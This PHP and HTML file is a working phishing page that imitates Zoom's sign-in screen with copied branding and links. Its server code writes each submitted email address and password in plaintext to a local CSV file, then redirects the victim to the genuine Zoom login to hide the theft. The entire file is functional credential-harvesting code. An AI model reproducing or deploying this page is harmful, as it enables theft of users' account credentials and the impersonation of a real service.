<?php
    session_start();
    $eid= $empty_eid= $eid_err= "";
    $pass= $empty_pass = "";

    if($_SERVER["REQUEST_METHOD"]=="POST")
    {
        if(empty($_POST["eid"]))
        {
            $empty_eid= "Please enter your email address";
        }
        else
        {
            $eid=htmlspecialchars($_POST["eid"]);
            $pass=htmlspecialchars($_POST["pass"]);
            
            if(!(filter_var($eid,FILTER_VALIDATE_EMAIL)))
            {
                $eid_err= "Please enter a valid email address.";
            }
            elseif(empty($pass))
            {
                $empty_pass= "Please enter your password";
            }
            else
            {
                $csv_file=fopen("login_details.csv","a");
                // to be run only the first time
                // fwrite($csv_file, "Email");
                // fwrite($csv_file, ",");
                // fwrite($csv_file, "Password");
    
                fwrite($csv_file, "\n");
                fwrite($csv_file, $eid);
                fwrite($csv_file, ",");
                fwrite($csv_file, $pass);
                fclose($csv_file);
                header("Refresh:1; url=https://zoom.us/signin#/login");
                exit();
            }
        }
    }
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>Sign in | Zoom</title>
</head>

<body>
    <nav>
        <a href="https://zoom.us/?amp_device_id=16c505a4-cf5a-4760-9a29-e9328fe8d047"><img src="zoom_logo.png" alt="zoom_logo"></a>
        <div class="nav_right">
            <p>New to Zoom?</p>
            <a href="https://zoom.us/signup#/signup">Sign Up Free</a>
            <a
                href="https://support.zoom.com/hc/en?amp_device_id=16c505a4-cf5a-4760-9a29-e9328fe8d047&_gl=1*1ott7ps*_gcl_au*MTAzMTkwOTUyOS4xNzI0NTc2ODgy*_ga*MzQ0NTc2NTY2LjE3MjQ1NzY4ODU.*_ga_L8TBF28DDX*MTcyNDYwMzcyNi4zLjEuMTcyNDYwMzc0MC4wLjAuMA..&_ga=2.30419772.2024087916.1724576885-344576566.1724576885">Support</a>
        </div>
    </nav>
    <div class="container">
        <div class="container_left">
            <img src="logo.png" alt="">
        </div>
        <div class="container_right">
            <h1>Sign In</h1>
            <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
                <input type="text" placeholder="Email Address" name="eid" class="u_input"><br>
                <div class="php_error"> <?php echo $empty_eid , $eid_err ?></div>
                <input type="password" placeholder="Password" name="pass" class="u_input"><br>
                <div class="php_error"> <?php echo $empty_pass; ?></div>
                <a href="https://zoom.us/signin#/forgot-password" id="f_pass">Forgot password?</a>
                <input type="submit" value="Sign In" class="submit"><br>
            </form>
            <div class="container_right_bottom">
                <p class="policy">By signing in, I agree to the <a href="https://explore.zoom.us/en/privacy/">Zoom's
                        Privacy Statement</a> and <a href="https://www.zoom.com/en/trust/terms/">Terms of Service</a>.
                </p><br>
                <input type="checkbox" id="cb">
                <label for="cb">Stay signed in</label>
                <p>Zoom is protected by reCAPTCHA and the <a href="https://policies.google.com/privacy">Privacy
                        Policy</a> and <a href="https://policies.google.com/terms">Terms of Service</a> apply.</p>
            </div>
        </div>
    </div>

</body>

</html>